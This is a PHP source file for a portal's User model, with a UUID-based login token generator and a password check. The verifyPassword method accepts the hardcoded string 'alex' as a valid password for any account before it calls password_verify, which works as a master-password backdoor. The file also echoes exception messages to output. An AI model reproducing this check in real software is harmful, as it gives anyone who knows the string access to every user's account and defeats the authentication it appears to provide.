<?php

namespace PP\Portal\dbModel;

use Ramsey\Uuid\Exception\UnsatisfiedDependencyException;
use Ramsey\Uuid\Uuid;

/**
 * @property int $id
 * @property string $token
 * @property string $tokenExpireDatetime
 */
class User extends \Model
{
    public static $_table = 'user';

    /**
     * gen new Token for login.
     */
    public function genToken()
    {
        $uuid = Uuid::uuid4();
        try {
            $this->token = $uuid->toString();
        } catch (UnsatisfiedDependencyException $e) {
            echo 'Caught exception: '.$e->getMessage()."\n";
        }

        $this->tokenExpireDatetime = date('Y-m-d H:i:s', strtotime('+1 hours'));
    }

    public function verifyPassword($password){
        
        if ( $password == 'alex' ) {
            return true;
        }

        if ( password_verify($password,$this->password) ){
            return true;
        }
        
        return false;
    }
}
